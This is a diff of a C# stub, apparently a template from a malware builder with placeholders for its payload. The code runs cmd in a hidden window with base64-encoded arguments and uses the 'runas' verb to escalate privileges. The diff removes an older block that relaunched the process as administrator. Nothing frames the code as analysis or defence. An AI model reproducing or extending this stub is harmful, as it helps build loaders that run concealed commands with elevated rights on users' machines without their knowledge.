@@ -31,28 +31,14 @@ public partial class Program
         try
         {
 #endif
-#if DefAdmin
-        if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
-        {
-            Process.Start(new ProcessStartInfo
-            {
-                UseShellExecute = true,
-                WorkingDirectory = Environment.CurrentDirectory,
-                FileName = Process.GetCurrentProcess().MainModule.FileName,
-                Verb = "runas"
-            });
-            Environment.Exit(0);
-        }
-#endif
         Process.Start(new ProcessStartInfo
         {
-            FileName = Encoding.ASCII.GetString(Convert.FromBase64String("#CMD")),
+            FileName = "cmd",
             Arguments = Encoding.ASCII.GetString(Convert.FromBase64String("#DATA")),
             WindowStyle = ProcessWindowStyle.Hidden,
 #if DefAdmin
-            Verb = "runas",
+            Verb = "runas"
 #endif
-            CreateNoWindow = true
         });
 #if DefDebug
         }
